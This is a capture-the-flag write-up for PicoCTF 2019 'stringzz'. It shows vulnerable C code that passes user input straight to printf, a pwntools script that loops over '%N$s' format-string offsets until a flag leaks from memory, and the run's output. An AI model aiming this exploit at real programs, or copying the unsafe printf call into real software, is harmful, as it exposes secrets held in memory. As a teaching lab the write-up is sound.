---
title: Leak all the stack
description: Leak all the stack using a format string attack.
---

# Format string - Leak all the stack

## Summary

Leak all the stack using a format string attack.

## Challenge

### Statement

!!! note ""
    Challenge : `stringzz` from PicoCTF 2019.

Use a format string to pwn this [program](https://2019shell1.picoctf.com/static/31d401db5c499308034d1795794324ad/vuln) and get a flag.

### Source code

```c linenums="1"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAG_BUFFER 128
#define LINE_BUFFER_SIZE 2000

void printMessage3(char *in)
{
  puts("will be printed:\n");
  printf(in);
}
void printMessage2(char *in)
{
  puts("your input ");
  printMessage3(in);
}

void printMessage1(char *in)
{
  puts("Now ");
  printMessage2(in);
}

int main (int argc, char **argv)
{
    puts("input whatever string you want; then it will be printed back:\n");
    int read;
    unsigned int len;
    char *input = NULL;
    getline(&input, &len, stdin);
    //There is no win function, but the flag is wandering in the memory!
    char * buf = malloc(sizeof(char)*FLAG_BUFFER);
    FILE *f = fopen("flag.txt","r");
    fgets(buf,FLAG_BUFFER,f);
    printMessage1(input);
    fflush(stdout);

}
```

## Answer

Source code (solve.py) :

```python
#!/usr/bin/env python3
from pwn import process, log, context

PROGRAM = "./vuln"
DELIM = b"input whatever string you want; then it will be printed back:\n"

data = b""
i = 0
while b"FLAG{" not in data:
    log.info(f"Trying n°{i} ...")

    with context.local(log_level="error"):
        proc = process(PROGRAM)
        proc.sendlineafter(DELIM, f"%{i}$s".encode())
        proc.recvuntil(b"will be printed:\n\n")
        data = proc.recvall()

    log.info(f"Data : {data}")
    i += 1
```

Execution :

```bash
$ echo 'FLAG{gg}' > flag.txt
$ python3 solve.py
[*] Trying n°0 ...
[*] Data : b'%0$s\n'
[*] Trying n°1 ...
[*] Data : b''
[*] Trying n°2 ...
[*] Data : b''
[*] Trying n°3 ...
[*] Data : b'\x81\xc3\xbb\x18\n'
[...]
[*] Trying n°35 ...
[*] Data : b''
[*] Trying n°36 ...
[*] Data : b'%36$s\n\n'
[*] Trying n°37 ...
[*] Data : b'FLAG{gg}\n\n'
```